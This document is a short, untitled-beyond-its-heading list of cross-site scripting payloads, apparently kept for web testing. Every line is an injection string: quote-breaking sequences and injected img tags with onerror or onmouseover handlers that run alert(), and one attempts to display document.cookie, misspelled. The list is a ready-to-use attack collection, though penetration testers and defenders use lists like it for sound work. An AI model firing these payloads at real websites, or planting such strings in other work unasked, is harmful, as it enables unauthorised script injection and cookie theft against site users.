# xss-payloads
'; alert(documment.cookie);//
XSS1"<img/src=x onmouseover=alert(/XSS1test/)//
XSS2"<img src=x onmouseover=alert('XSS1test')//
XSS3"<img src=x onmouseover=alert("XSS1test")//
test'-alert('XSS2test')-'xss
test'-alert(/XSS2test/)-'xss
test'/alert(/XSS2test/)/'xss
test"><img/src=x onerror=alert(XSS3test)>'
test"><img/src=x onerror=alert('XSS3test')>'
test"><img src=x onmouseover=alert('XSS3test')>'
<img src=x onmouseover=alert('XSS3test')>'
<img/src=x onmouseover=alert(1234)>'
